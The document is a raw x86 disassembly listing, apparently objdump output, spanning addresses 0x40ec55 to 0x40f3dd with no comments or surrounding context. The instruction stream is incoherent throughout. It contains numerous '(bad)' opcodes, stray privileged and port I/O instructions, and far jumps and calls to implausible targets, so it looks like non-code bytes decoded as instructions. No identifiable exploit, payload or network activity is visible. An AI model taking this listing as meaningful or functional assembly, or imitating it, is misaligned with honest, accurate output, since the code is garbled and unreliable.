  40ec55:	jae    0x40ecb1
  40ec57:	aaa    
  40ec58:	jmp    0x40ecb8
  40ec5a:	gs dec esi
  40ec5c:	dec    edx
  40ec5d:	jo     0x40ecb9
  40ec5f:	pop    esp
  40ec60:	ret    
  40ec61:	popa   
  40ec62:	stc    
  40ec63:	ss push ss
  40ec65:	add    bl,al
  40ec67:	cmp    ecx,0xffffffc0
  40ec6a:	mov    bl,0x1f
  40ec6c:	mov    edx,0x4d43fabd
  40ec71:	test   BYTE PTR [ebx-0x50],bl
  40ec74:	push   cs
  40ec75:	repnz lods al,BYTE PTR ds:[esi]
  40ec77:	scas   al,BYTE PTR es:[edi]
  40ec78:	fdivr  st,st(4)
  40ec7a:	test   BYTE PTR fs:[ebp+0x3ebfca9a],ch
  40ec81:	mov    edi,0xfaa26a10
  40ec86:	adc    ah,BYTE PTR [esi]
  40ec88:	mov    ch,0xe6
  40ec8a:	push   edx
  40ec8b:	imul   esp,DWORD PTR [ebx+ecx*4+0x3ab13d38],0x5453db0a
  40ec96:	pop    ebx
  40ec97:	je     0x40ec5e
  40ec99:	cmp    eax,0xa36432e6
  40ec9e:	loope  0x40ec9f
  40eca0:	fisub  DWORD PTR ds:[eax]
  40eca3:	mov    DWORD PTR [ebp+0x48],ebp
  40eca6:	pop    ecx
  40eca7:	sub    eax,0xc9bde2c2
  40ecac:	in     al,dx
  40ecad:	push   esp
  40ecae:	pop    ebx
  40ecaf:	push   eax
  40ecb0:	push   ds
  40ecb1:	push   esi
  40ecb2:	shr    DWORD PTR [eax],1
  40ecb4:	call   0xffc5511c
  40ecb9:	jne    0x40ecf7
  40ecbb:	stc    
  40ecbc:	and    edi,ecx
  40ecbe:	mov    ebp,0x5427f652
  40ecc3:	push   eax
  40ecc4:	in     al,0xda
  40ecc6:	and    dh,BYTE PTR [ebx]
  40ecc8:	dec    edx
  40ecc9:	daa    
  40ecca:	jne    0x40ec5f
  40eccc:	ds sub ebx,ebp
  40eccf:	mov    DWORD PTR [edi+eax*8],ecx
  40ecd2:	push   ebp
  40ecd3:	out    dx,eax
  40ecd4:	mov    ecx,0x59724733
  40ecd9:	loope  0x40ec98
  40ecdb:	inc    ebp
  40ecdc:	ins    BYTE PTR es:[edi],dx
  40ecdd:	(bad)  
  40ecdf:	rol    BYTE PTR [ebx-0x30842f19],cl
  40ece5:	wrmsr  
  40ece7:	sbb    eax,0xc32c6b3e
  40ecec:	ja     0x40ec8a
  40ecee:	push   esi
  40ecef:	mov    al,ds:0xda34fa15
  40ecf4:	mov    edx,0x9dd45868
  40ecf9:	addr16 call 0x57b:0xefb73feb
  40ed01:	inc    eax
  40ed02:	fmul   DWORD PTR [ebx+ebx*1-0x1a]
  40ed06:	add    dl,cl
  40ed08:	es dec esp
  40ed0a:	rol    bh,1
  40ed0c:	paddusw mm4,QWORD PTR [eax+0x5b4519da]
  40ed13:	pop    esi
  40ed14:	sub    ch,BYTE PTR ds:[ebp-0x78]
  40ed18:	(bad)  
  40ed19:	scas   eax,DWORD PTR es:[edi]
  40ed1a:	add    DWORD PTR [esi+ecx*4+0x288ef9a2],0x1de50643
  40ed25:	cmc    
  40ed26:	xor    ebx,DWORD PTR [edi+0x61]
  40ed29:	sub    eax,0xdc7d850c
  40ed2e:	cli    
  40ed2f:	push   cs
  40ed30:	stos   DWORD PTR es:[edi],eax
  40ed31:	jmp    0xe7ffd2f2
  40ed36:	xchg   edi,eax
  40ed37:	not    DWORD PTR [esi-0x2219190c]
  40ed3d:	fs pop ebx
  40ed3f:	dec    esp
  40ed40:	inc    ah
  40ed42:	cmc    
  40ed43:	popf   
  40ed44:	es in  al,dx
  40ed46:	scas   al,BYTE PTR es:[edi]
  40ed47:	mov    bl,BYTE PTR [ecx+0x326b48c7]
  40ed4d:	cwde   
  40ed4e:	imul   ebx,DWORD PTR [edi*4-0x219fb84a],0x91d66fe6
  40ed59:	dec    eax
  40ed5a:	mov    dh,BYTE PTR [edx-0x423b579c]
  40ed60:	hlt    
  40ed61:	out    0x67,al
  40ed63:	cmp    al,BYTE PTR [ebp+eax*1+0x3f380d36]
  40ed6a:	gs sbb al,0x1c
  40ed6d:	dec    edi
  40ed6e:	push   ss
  40ed6f:	add    ebx,DWORD PTR [edi-0x44bc36d9]
  40ed75:	out    0x76,al
  40ed77:	daa    
  40ed78:	in     al,0xac
  40ed7a:	outs   dx,BYTE PTR ds:[esi]
  40ed7b:	or     DWORD PTR [ecx+0x13],esp
  40ed7e:	mov    dl,0x94
  40ed80:	adc    BYTE PTR [edi+0x5e],0xa0
  40ed84:	jbe    0x40edac
  40ed86:	cmp    bl,BYTE PTR [ecx]
  40ed88:	or     al,0xda
  40ed8a:	push   es
  40ed8b:	xlat   BYTE PTR ds:[ebx]
  40ed8c:	add    DWORD PTR [eax+0x4bbce26c],edx
  40ed92:	pop    ebp
  40ed93:	xchg   edx,eax
  40ed94:	ds hlt 
  40ed96:	xchg   ebx,eax
  40ed97:	jle    0x40ed6f
  40ed99:	mov    esp,0xec7a0aee
  40ed9e:	pop    edx
  40ed9f:	js     0x40ee15
  40eda1:	or     edx,ecx
  40eda3:	lods   eax,DWORD PTR ds:[esi]
  40eda4:	pop    esi
  40eda5:	mov    al,0x56
  40eda7:	mov    ebx,0x112dad99
  40edac:	cmp    BYTE PTR [esi],0xf7
  40edaf:	mov    edi,eax
  40edb1:	int    0x17
  40edb3:	test   BYTE PTR [edi],bh
  40edb5:	lds    ebx,FWORD PTR [esi+0x6b]
  40edb8:	adc    edi,DWORD PTR [ebp+0x79]
  40edbb:	inc    ecx
  40edbc:	cmp    eax,0xe5c006f8
  40edc1:	pop    eax
  40edc2:	arpl   ax,bx
  40edc4:	mov    ecx,DWORD PTR [ebx+0xa358427]
  40edca:	pop    esp
  40edcb:	jecxz  0x40edab
  40edcd:	and    al,0x5b
  40edcf:	push   ds
  40edd0:	adc    edx,edx
  40edd2:	call   0xa85d:0xee64ddd
  40edd9:	and    DWORD PTR [ebx-0x51ae70c5],eax
  40eddf:	mov    DWORD PTR [ecx],0xa60c5bfa
  40ede5:	sub    ah,BYTE PTR [ecx]
  40ede7:	jmp    0x854be85e
  40edec:	fscale 
  40edee:	xchg   ebp,eax
  40edef:	loope  0x40ee25
  40edf1:	dec    edi
  40edf2:	sbb    al,0x34
  40edf4:	inc    ebp
  40edf5:	mov    dl,0x21
  40edf7:	pusha  
  40edf8:	test   DWORD PTR [edx+0x5a],edi
  40edfb:	or     BYTE PTR [edx+0x2b7976e7],0xfd
  40ee02:	xchg   esi,eax
  40ee03:	test   esp,esi
  40ee05:	sar    DWORD PTR [ebp+0x3],1
  40ee08:	dec    ecx
  40ee09:	add    al,0x5b
  40ee0b:	mov    al,0xa3
  40ee0d:	pop    ecx
  40ee0e:	xlat   BYTE PTR ds:[ebx]
  40ee0f:	and    ecx,esp
  40ee11:	jno    0x40ee27
  40ee13:	xor    eax,0x56453cad
  40ee18:	xor    DWORD PTR [edi],esp
  40ee1a:	call   0xaf77:0xf3b539c4
  40ee21:	cmp    ch,BYTE PTR [ebx]
  40ee23:	or     cl,BYTE PTR [ecx+0x8]
  40ee26:	mov    bh,0x55
  40ee28:	sbb    BYTE PTR [eax-0x38],dl
  40ee2b:	test   DWORD PTR [edx],edx
  40ee2d:	mov    ds:0xc33f82fb,eax
  40ee32:	div    BYTE PTR [ebx]
  40ee34:	sub    edi,DWORD PTR [ecx-0x70]
  40ee37:	out    dx,al
  40ee38:	cdq    
  40ee39:	call   0x9edf2756
  40ee3e:	pop    eax
  40ee3f:	jne    0x40ee4a
  40ee41:	call   0xcf7a:0x88a432e
  40ee48:	test   edi,ecx
  40ee4a:	push   esp
  40ee4b:	push   edx
  40ee4c:	(bad)  
  40ee4e:	and    al,0xb
  40ee50:	(bad)  
  40ee52:	add    al,al
  40ee54:	adc    ch,BYTE PTR [edx+0x47]
  40ee57:	inc    ebp
  40ee58:	push   ebx
  40ee59:	push   ebx
  40ee5a:	pop    edx
  40ee5b:	cmp    eax,0x3a5592d0
  40ee60:	mov    edi,0xa547bf46
  40ee65:	out    0xce,al
  40ee67:	xor    BYTE PTR [edi-0x5e],ah
  40ee6a:	or     eax,0xa36ac6bb
  40ee6f:	outs   dx,BYTE PTR ds:[esi]
  40ee70:	add    al,0xe1
  40ee72:	pop    ecx
  40ee73:	loopne 0x40ee24
  40ee75:	pop    edi
  40ee76:	jmp    0xd87b37d0
  40ee7b:	xchg   edx,eax
  40ee7c:	lods   al,BYTE PTR ds:[esi]
  40ee7d:	ds repz aas 
  40ee80:	and    BYTE PTR [eax*1+0x49c6e385],al
  40ee87:	arpl   WORD PTR [esi],di
  40ee89:	fnstcw WORD PTR [esi]
  40ee8b:	jnp    0x40ee6b
  40ee8d:	std    
  40ee8e:	xchg   esp,eax
  40ee8f:	xchg   ecx,eax
  40ee90:	inc    edx
  40ee91:	out    0xdc,eax
  40ee93:	sub    eax,0x5f8cf9a5
  40ee98:	imul   eax,DWORD PTR [ebp+0x5c],0x5b97d7b7
  40ee9f:	sub    BYTE PTR [ecx],dh
  40eea1:	aam    0xf4
  40eea3:	mov    al,0xfa
  40eea5:	lahf   
  40eea6:	push   0xfffffff7
  40eea8:	sub    DWORD PTR ds:0xd649255a,ebx
  40eeae:	inc    edx
  40eeaf:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb1:	mov    cl,0x5a
  40eeb3:	cwde   
  40eeb4:	push   edx
  40eeb5:	jmp    0x3442:0x905b
  40eebb:	hlt    
  40eebc:	xor    ch,BYTE PTR [ecx+0x59]
  40eebf:	cli    
  40eec0:	sti    
  40eec1:	push   es
  40eec2:	out    0x6f,al
  40eec4:	sbb    ebx,esi
  40eec6:	lods   eax,DWORD PTR ds:[esi]
  40eec7:	loopne 0x40ef27
  40eec9:	inc    eax
  40eeca:	sbb    BYTE PTR [ecx+0x60],al
  40eecd:	in     eax,0x17
  40eecf:	test   BYTE PTR [ebp+0x3f9e3dff],bh
  40eed5:	inc    ecx
  40eed6:	out    0xc2,al
  40eed8:	or     DWORD PTR [ebp-0x198cc28a],esp
  40eede:	cs nop
  40eee0:	adc    eax,0x6ea3251e
  40eee5:	(bad)  
  40eee6:	adc    DWORD PTR ss:[bx-0x7fa3],edi
  40eeec:	ret    0x6d75
  40eeef:	xchg   ecx,eax
  40eef0:	out    dx,eax
  40eef1:	fdivrp st(3),st
  40eef3:	mov    edi,0x85b4cca0
  40eef8:	das    
  40eef9:	adc    ebx,DWORD PTR [esi+0x246d39e5]
  40eeff:	sub    dl,ch
  40ef01:	call   0xb5f3:0x77a7594e
  40ef08:	in     al,0x4f
  40ef0a:	mov    ds:0xfdecdc85,al
  40ef0f:	out    0x3e,eax
  40ef11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef12:	fadd   DWORD PTR [esi-0x151e49d]
  40ef18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef19:	loopne 0x40ef95
  40ef1b:	into   
  40ef1c:	imul   eax,DWORD PTR [ecx],0xffffffef
  40ef1f:	jl     0x40ef0d
  40ef21:	ficomp WORD PTR [esi+0x6a]
  40ef24:	cmp    DWORD PTR [edi+0x57],ebp
  40ef27:	das    
  40ef28:	sub    bp,WORD PTR [edx]
  40ef2b:	jmp    0xe62b:0xd00cc733
  40ef32:	and    al,0x98
  40ef34:	in     al,dx
  40ef35:	test   DWORD PTR [eax+0x286a7741],ebx
  40ef3b:	stc    
  40ef3c:	jmp    0x259149cb
  40ef41:	pop    edx
  40ef42:	js     0x40ef08
  40ef44:	or     esi,esp
  40ef46:	xor    al,0x6d
  40ef48:	out    0x5c,al
  40ef4a:	mov    ds:0xe203f643,al
  40ef4f:	xchg   BYTE PTR [ebx-0x1235a5c4],dl
  40ef55:	pop    edx
  40ef56:	bound  edx,QWORD PTR [esp+eax*8]
  40ef59:	cli    
  40ef5a:	test   BYTE PTR [ecx+esi*8+0x3e688ce0],al
  40ef61:	push   ebp
  40ef62:	loopne 0x40efbd
  40ef64:	out    dx,eax
  40ef65:	push   eax
  40ef66:	bound  ebp,QWORD PTR [edi]
  40ef68:	mov    cl,0xe9
  40ef6a:	mov    ah,0x9b
  40ef6c:	add    edi,DWORD PTR [esi]
  40ef6e:	adc    eax,0x639cf67
  40ef73:	add    al,0x3e
  40ef75:	int    0xd1
  40ef77:	idiv   BYTE PTR [esi+0x41]
  40ef7a:	mov    edi,0x80e08a20
  40ef7f:	lock adc BYTE PTR [eax+ebx*2],bl
  40ef83:	pop    esp
  40ef84:	pop    ds
  40ef85:	es adc edx,ebp
  40ef88:	dec    esp
  40ef89:	add    DWORD PTR [eax+0x69],eax
  40ef8c:	fistp  QWORD PTR [ebx+eax*8+0x428ebb8c]
  40ef93:	(bad)  
  40ef94:	cs sub eax,0xb5df05d9
  40ef9a:	add    DWORD PTR [edx+0x78],0x328e2b27
  40efa1:	addr16 or esp,eax
  40efa4:	enter  0xe813,0xcb
  40efa8:	dec    ebx
  40efa9:	dec    esi
  40efaa:	pop    edx
  40efab:	add    bh,al
  40efad:	add    DWORD PTR [ecx-0x646e0b9c],edi
  40efb3:	test   BYTE PTR [esi+0x3f7bff29],dh
  40efb9:	dec    edi
  40efba:	mov    eax,ds:0x7e745e99
  40efbf:	sub    esi,DWORD PTR [edi]
  40efc1:	sti    
  40efc2:	cmp    al,0x93
  40efc4:	es add ecx,ebx
  40efc7:	push   0x5d
  40efc9:	imul   ebx,DWORD PTR [edx+0x45],0xf9cf73f
  40efd0:	dec    ecx
  40efd1:	xchg   esi,eax
  40efd2:	xchg   esp,eax
  40efd3:	nop
  40efd4:	in     eax,dx
  40efd5:	xchg   edi,eax
  40efd6:	retf   0x3e6b
  40efd9:	add    DWORD PTR [ebp-0x2],ebx
  40efdc:	ja     0x40efd8
  40efde:	push   ecx
  40efdf:	add    bh,BYTE PTR [esi]
  40efe1:	int    0xe
  40efe3:	mov    ah,BYTE PTR [edx+0xea174df]
  40efe9:	out    0xd8,al
  40efeb:	mov    WORD PTR ds:0x3b1d512d,gs
  40eff1:	not    DWORD PTR [bp+si]
  40eff4:	sub    cl,BYTE PTR [ebp-0x3f9635a6]
  40effa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40effb:	leave  
  40effc:	clc    
  40effd:	and    eax,0x4879853d
  40f002:	mov    al,0xa
  40f004:	aas    
  40f005:	xchg   ebx,eax
  40f006:	push   ebp
  40f007:	xor    al,0x76
  40f009:	mov    ecx,0xe067094d
  40f00e:	mov    WORD PTR [ecx],ds
  40f010:	inc    edi
  40f011:	ss nop
  40f013:	sbb    DWORD PTR [edi+0x3ed06832],0xb6b1c4b
  40f01d:	sar    DWORD PTR [esi-0x4c],1
  40f020:	adc    ax,0x137c
  40f024:	sub    ch,dl
  40f026:	mov    eax,0x49791c85
  40f02b:	pop    edx
  40f02c:	sub    DWORD PTR ds:[eax],edx
  40f02f:	mov    ecx,0x1c6ad16d
  40f034:	adc    DWORD PTR [esi+0x5c],edx
  40f037:	add    bh,BYTE PTR ds:0x57afba8b
  40f03d:	ficomp DWORD PTR [edi]
  40f040:	jmp    0x40effc
  40f042:	rcl    BYTE PTR [edi*2-0x5c25a4e4],1
  40f049:	sub    al,0x88
  40f04b:	jecxz  0x40f06e
  40f04d:	out    0x3a,al
  40f04f:	dec    ebp
  40f050:	repz in eax,0xbe
  40f053:	stos   BYTE PTR es:[edi],al
  40f054:	sbb    DWORD PTR [eax],esi
  40f056:	cmc    
  40f057:	pop    ecx
  40f058:	das    
  40f059:	out    0x49,al
  40f05b:	and    BYTE PTR [ebp+0x1b],ch
  40f05e:	dec    esp
  40f05f:	test   BYTE PTR [edx],bh
  40f061:	out    0xfa,eax
  40f063:	jle    0x40f06a
  40f065:	or     eax,0x5179f559
  40f06a:	gs test eax,0x25b8b2a
  40f070:	or     BYTE PTR [ebp+0x41dca3f7],0x19
  40f077:	test   BYTE PTR [eax],al
  40f079:	pop    ds
  40f07a:	mov    WORD PTR [edi-0x75a7ac79],fs
  40f080:	ds icebp 
  40f082:	pushf  
  40f083:	imul   ebx,DWORD PTR [edi+0x33],0xffffffe9
  40f087:	mov    dl,0xb5
  40f089:	fld    DWORD PTR [edx-0x6418007b]
  40f08f:	aaa    
  40f090:	or     al,0x5b
  40f092:	(bad)  
  40f093:	sbb    bh,BYTE PTR [edi]
  40f095:	mov    cl,0x12
  40f097:	inc    edx
  40f098:	retf   
  40f099:	sub    BYTE PTR [ecx+edi*4+0x61],cl
  40f09d:	push   cs
  40f09e:	hlt    
  40f09f:	and    DWORD PTR [ebx+ebp*1+0x12a780e8],esp
  40f0a6:	ret    0xfb9a
  40f0a9:	inc    esi
  40f0aa:	call   0xdf7c:0x5b5c11f9
  40f0b1:	sub    al,0x79
  40f0b3:	ja     0x40f047
  40f0b5:	scas   eax,DWORD PTR es:[edi]
  40f0b6:	daa    
  40f0b7:	adc    BYTE PTR [ebp+0x316d0f31],0x72
  40f0be:	fisub  DWORD PTR [ebp+0x18]
  40f0c1:	lahf   
  40f0c2:	adc    bl,al
  40f0c4:	jnp    0x40f138
  40f0c6:	pop    ebp
  40f0c7:	(bad)  
  40f0c8:	(bad)  
  40f0c9:	enter  0xf49b,0xf2
  40f0cd:	push   0xffffffb6
  40f0cf:	test   DWORD PTR [ebp+0x6d9a709],ebx
  40f0d5:	and    edx,DWORD PTR [ebp+0x6a5fb8aa]
  40f0db:	call   0xd6641774
  40f0e0:	mov    esp,0x73c57ce6
  40f0e5:	sub    eax,0xb91742a7
  40f0ea:	dec    ecx
  40f0eb:	push   ebp
  40f0ec:	call   0x70bd:0x685e58c1
  40f0f3:	push   ebp
  40f0f4:	and    esi,0x1a
  40f0f7:	inc    esp
  40f0f8:	mov    esp,0xa8f80859
  40f0fd:	push   es
  40f0fe:	stc    
  40f0ff:	inc    edx
  40f100:	ss jmp 0x40f158
  40f103:	(bad)  
  40f104:	(bad)  
  40f105:	mov    al,0xe2
  40f107:	adc    DWORD PTR [ecx-0x62badd19],edx
  40f10d:	fcom   QWORD PTR [ebp+0x5d03d275]
  40f113:	mov    esi,0xac5a92e3
  40f118:	dec    ebx
  40f119:	int3   
  40f11a:	push   esi
  40f11b:	and    esi,esp
  40f11d:	or     BYTE PTR [esi-0x7c],ch
  40f120:	sub    al,0xd7
  40f122:	test   eax,0xe688cb7e
  40f127:	push   cs
  40f128:	jb     0x40f117
  40f12a:	pop    ebx
  40f12b:	hlt    
  40f12c:	cwde   
  40f12d:	jns    0x40f14e
  40f12f:	inc    ecx
  40f130:	dec    edx
  40f131:	bound  esi,QWORD PTR [ebp-0x7c]
  40f134:	jle    0x40f12d
  40f136:	gs push ds
  40f138:	aas    
  40f139:	mov    eax,ds:0x4446e1ce
  40f13e:	add    DWORD PTR [ecx-0x708380c],eax
  40f144:	sbb    BYTE PTR [ebx+0x3f65859f],cl
  40f14a:	jb     0x40f117
  40f14c:	aas    
  40f14d:	inc    ecx
  40f14e:	push   0x2ada0fbc
  40f153:	and    eax,0x1308e681
  40f158:	fwait
  40f159:	or     ebx,DWORD PTR [ebx+esi*8+0x2bebe994]
  40f160:	and    eax,0x47da5ba7
  40f165:	popf   
  40f166:	mov    BYTE PTR [edi+0x3a],dh
  40f169:	(bad)  
  40f16a:	enter  0xb785,0xbc
  40f16e:	sti    
  40f16f:	scas   al,BYTE PTR es:[edi]
  40f170:	xor    DWORD PTR [ecx],esp
  40f172:	xor    bl,0xd2
  40f175:	fs xchg ecx,eax
  40f177:	adc    ah,BYTE PTR [esi-0x1a]
  40f17a:	ss xchg ebx,eax
  40f17c:	mov    es,ecx
  40f17e:	lods   eax,DWORD PTR ds:[esi]
  40f17f:	shl    BYTE PTR [ebx+ecx*2-0x41],1
  40f183:	jle    0x40f1f9
  40f185:	in     eax,0x9f
  40f187:	mov    bh,0xfc
  40f189:	out    0x52,eax
  40f18b:	sub    ebx,esi
  40f18d:	ja     0x40f1dd
  40f18f:	mov    dl,0x3e
  40f191:	xchg   esp,esp
  40f193:	push   ebp
  40f194:	jne    0x40f205
  40f196:	loop   0x40f20e
  40f198:	(bad)  
  40f199:	fcmovnbe st,st(2)
  40f19b:	pop    es
  40f19c:	hlt    
  40f19d:	in     eax,dx
  40f19e:	out    dx,eax
  40f19f:	mov    DWORD PTR [edi-0xdedd49c],edi
  40f1a5:	inc    esi
  40f1a6:	ja     0x40f1fa
  40f1a8:	sub    DWORD PTR [ebp-0x1808ee7a],esp
  40f1ae:	pop    ebp
  40f1af:	push   0xd197f098
  40f1b4:	and    BYTE PTR [edi-0x43a1cbbe],cl
  40f1ba:	pop    ebx
  40f1bb:	shl    cl,cl
  40f1bd:	cmp    bl,ah
  40f1bf:	outs   dx,DWORD PTR ds:[esi]
  40f1c0:	inc    edi
  40f1c1:	iret   
  40f1c2:	pop    edx
  40f1c3:	cli    
  40f1c4:	cld    
  40f1c5:	adc    edx,DWORD PTR [edi]
  40f1c7:	push   ss
  40f1c8:	nop
  40f1c9:	ss xchg esi,eax
  40f1cb:	mov    dl,ch
  40f1cd:	fadd   QWORD PTR [edi+ebx*1]
  40f1d1:	push   ss
  40f1d2:	fcmovnb st,st(6)
  40f1d4:	mov    ds:0x891fa8ea,eax
  40f1da:	(bad)  
  40f1db:	and    eax,0xc3ece970
  40f1e0:	(bad)  
  40f1e1:	shr    DWORD PTR [esi+0x5436458f],1
  40f1e7:	in     eax,0x3e
  40f1e9:	or     eax,0x250c2d47
  40f1ee:	mov    ecx,0xfee76b27
  40f1f3:	xor    DWORD PTR [ebp+0x7bdfdcbe],edi
  40f1f9:	inc    esp
  40f1fa:	xlat   BYTE PTR ds:[ebx]
  40f1fb:	lea    esp,[ebx-0x5b17a431]
  40f201:	xchg   ebx,eax
  40f202:	push   ss
  40f203:	sbb    dh,0x54
  40f206:	in     al,0x85
  40f208:	or     edx,DWORD PTR [eax]
  40f20a:	fwait
  40f20b:	in     al,dx
  40f20c:	ds inc ecx
  40f20e:	cmp    al,0xe5
  40f210:	aaa    
  40f211:	inc    BYTE PTR [edi-0x20]
  40f214:	out    0x54,ax
  40f217:	(bad)  
  40f219:	push   ss
  40f21a:	add    ebp,DWORD PTR [ebp+0x45]
  40f21d:	or     eax,0x4d3ee8b1
  40f222:	xchg   edx,eax
  40f223:	int    0x3d
  40f225:	lahf   
  40f226:	push   0xf8e7717d
  40f22b:	sbb    BYTE PTR [eax],0x9a
  40f22e:	shl    DWORD PTR [edi+0x45eabb2f],0xd6
  40f235:	xor    bl,BYTE PTR [edx-0x8]
  40f238:	and    esp,DWORD PTR [ebx+0x1ecedaf1]
  40f23e:	xchg   edx,eax
  40f23f:	test   BYTE PTR [eax+0x46],dl
  40f242:	mov    ebx,0xd2c7a7af
  40f247:	fdivr  DWORD PTR [edx-0x507af4d4]
  40f24d:	lea    ebp,[edx+0x22]
  40f250:	shl    dl,cl
  40f252:	adc    eax,0x719da884
  40f257:	mov    BYTE PTR [esi],bh
  40f259:	jno    0x40f212
  40f25b:	mov    WORD PTR [edi+edx*2-0x249a1d3f],cs
  40f262:	pop    eax
  40f263:	jmp    0xdca1:0x50fae7b6
  40f26a:	loope  0x40f26a
  40f26c:	inc    esi
  40f26d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f26f:	jne    0x40f285
  40f271:	sar    esi,0x84
  40f274:	jmp    0x40f262
  40f276:	mov    WORD PTR [ecx],ss
  40f278:	pop    edx
  40f279:	out    0x4e,eax
  40f27b:	jle    0x40f2c0
  40f27d:	daa    
  40f27e:	sti    
  40f27f:	test   DWORD PTR [ecx+0x5f],ebp
  40f282:	xlat   BYTE PTR ds:[ebx]
  40f283:	pop    ebp
  40f284:	and    DWORD PTR [ecx],ecx
  40f286:	mov    dh,0x94
  40f288:	pop    ecx
  40f289:	into   
  40f28a:	fsubr  QWORD PTR [edx+eiz*8+0x6d858afa]
  40f291:	ss jno 0x40f226
  40f294:	fimul  DWORD PTR ds:0x935d852d
  40f29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f29b:	(bad)  
  40f29c:	outs   dx,BYTE PTR ds:[esi]
  40f29d:	scas   eax,DWORD PTR es:[edi]
  40f29e:	retf   
  40f29f:	into   
  40f2a0:	aas    
  40f2a1:	repz pop esp
  40f2a3:	or     DWORD PTR [edi-0x9],edi
  40f2a6:	cli    
  40f2a7:	push   ds
  40f2a8:	mov    ah,0xe6
  40f2aa:	jb     0x40f2f1
  40f2ac:	inc    edi
  40f2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ae:	or     dh,BYTE PTR [ebx-0x355671da]
  40f2b4:	in     al,0xb8
  40f2b6:	pop    ebx
  40f2b7:	sub    al,0xaa
  40f2b9:	push   esp
  40f2ba:	mov    ecx,0x772f30b6
  40f2bf:	and    BYTE PTR [esi],0x5d
  40f2c2:	rcr    DWORD PTR [esi+0x199b5b6e],0xc5
  40f2c9:	xor    bl,BYTE PTR [ecx+0x58]
  40f2cc:	hlt    
  40f2cd:	shld   DWORD PTR [eax+eiz*1+0x12afc21d],edi,0xf7
  40f2d6:	in     eax,dx
  40f2d7:	test   bh,al
  40f2d9:	and    bl,al
  40f2db:	into   
  40f2dc:	aas    
  40f2dd:	repz test al,0x55
  40f2e0:	loope  0x40f339
  40f2e2:	dec    eax
  40f2e3:	and    dl,BYTE PTR [edi+0x7ddf40e7]
  40f2e9:	(bad)  [edx-0x8]
  40f2ec:	jo     0x40f363
  40f2ee:	push   esi
  40f2ef:	cli    
  40f2f0:	cmp    BYTE PTR [ecx],bh
  40f2f2:	scas   eax,DWORD PTR es:[edi]
  40f2f3:	or     cl,dh
  40f2f5:	bound  esi,QWORD PTR [eax]
  40f2f7:	inc    edi
  40f2f8:	mov    bh,0x33
  40f2fa:	dec    ebx
  40f2fb:	xor    al,0x8f
  40f2fd:	xchg   esi,eax
  40f2fe:	xchg   esi,eax
  40f2ff:	scas   al,BYTE PTR es:[edi]
  40f300:	lods   al,BYTE PTR ds:[esi]
  40f301:	mov    esp,0x27a06e5e
  40f306:	or     eax,DWORD PTR ss:[edi]
  40f309:	out    0x9a,al
  40f30b:	mov    bl,0xb3
  40f30d:	inc    esp
  40f30e:	fcom   DWORD PTR [edx-0x5b]
  40f311:	mov    DWORD PTR [esi],edx
  40f313:	and    BYTE PTR [ecx+0x70],bh
  40f316:	pop    edx
  40f317:	shl    BYTE PTR [ebx+0x11],0x39
  40f31b:	mov    edx,0x84e6088c
  40f320:	int3   
  40f321:	test   eax,0x273f81e7
  40f326:	adc    BYTE PTR [edi-0x53969260],ch
  40f32c:	dec    ebx
  40f32d:	out    0x6e,eax
  40f32f:	gs enter 0xae96,0xa
  40f334:	fldcw  WORD PTR [ebx]
  40f336:	xor    eax,0x5b412a29
  40f33b:	ror    BYTE PTR [esi+edx*2],1
  40f33e:	sar    BYTE PTR [edx+0x5a95a4f7],cl
  40f344:	xchg   BYTE PTR [ebx-0xeca7b7a],cl
  40f34a:	daa    
  40f34b:	jge    0x40f38c
  40f34d:	sti    
  40f34e:	push   0x28
  40f350:	mov    dl,0x2
  40f352:	std    
  40f353:	dec    esi
  40f354:	jo     0x40f32e
  40f356:	jmp    0xbe56:0xf4669497
  40f35d:	jne    0x40f3bd
  40f35f:	sbb    al,0x47
  40f361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f362:	pop    ds
  40f363:	jb     0x40f3a4
  40f365:	sub    edi,DWORD PTR [ebp+0x72]
  40f368:	push   es
  40f369:	pusha  
  40f36a:	and    al,0xa8
  40f36c:	cmp    esi,esp
  40f36e:	xor    al,0x89
  40f370:	mov    ebx,DWORD PTR [edx]
  40f372:	dec    esp
  40f373:	pusha  
  40f374:	fistp  WORD PTR [edi-0x645dc76]
  40f37a:	pop    ebx
  40f37b:	dec    esi
  40f37c:	and    eax,0x86123d60
  40f381:	mov    dh,0x88
  40f383:	sbb    al,0xb3
  40f385:	and    ebx,DWORD PTR [edx+0x3e]
  40f388:	pop    ecx
  40f389:	fs in  eax,0x84
  40f38c:	xlat   BYTE PTR ds:[ebx]
  40f38d:	cmc    
  40f38e:	push   es
  40f38f:	inc    edx
  40f390:	lods   eax,DWORD PTR ds:[esi]
  40f391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f392:	push   ebp
  40f393:	js     0x40f3be
  40f395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f396:	xchg   BYTE PTR [ebp+0xf6ee74e],al
  40f39c:	lea    ebp,[esi+ebx*1]
  40f39f:	xor    DWORD PTR [ebx-0x5e],ecx
  40f3a2:	stos   BYTE PTR es:[edi],al
  40f3a3:	jge    0x40f33c
  40f3a5:	sub    bl,BYTE PTR [ebx-0x7e]
  40f3a8:	jbe    0x40f3a7
  40f3aa:	push   ss
  40f3ab:	cli    
  40f3ac:	and    BYTE PTR [edi+0x4b],0x85
  40f3b0:	js     0x40f366
  40f3b2:	int3   
  40f3b3:	idiv   DWORD PTR [edi]
  40f3b5:	addr16 (bad) 
  40f3b7:	mov    al,0x64
  40f3b9:	push   esi
  40f3ba:	jne    0x40f353
  40f3bc:	jmp    0x40f3a0
  40f3be:	xor    dl,BYTE PTR [eax-0x275dd764]
  40f3c4:	mov    esi,0x5e60d7
  40f3c9:	in     eax,dx
  40f3ca:	lea    edx,[eax]
  40f3cc:	ror    DWORD PTR ss:[esi],cl
  40f3cf:	aam    0x7e
  40f3d1:	pop    eax
  40f3d2:	jg     0x40f378
  40f3d4:	test   BYTE PTR [ebx],al
  40f3d6:	jl     0x40f41a
  40f3d8:	aas    
  40f3d9:	loopne 0x40f372
  40f3db:	in     al,0x3f
  40f3dd:	or     DWORD PTR [edx-0x587c6a78],esp
